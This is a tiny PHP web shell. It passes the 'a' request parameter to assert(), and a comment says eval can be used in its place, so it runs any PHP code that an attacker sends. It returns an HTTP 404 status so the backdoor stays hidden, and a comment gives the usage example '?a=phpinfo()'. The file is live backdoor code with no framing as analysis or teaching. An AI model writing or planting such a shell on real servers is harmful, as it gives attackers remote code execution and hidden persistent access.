<?php
//?a=phpinfo()
//assert($_REQUEST['a']);

//设置响应码404，隐藏起来
http_response_code(404);
$a = isset($_REQUEST['a'])?$_REQUEST['a']:false;
if($a){
	assert($a);
}

//assert可以换为eval
?>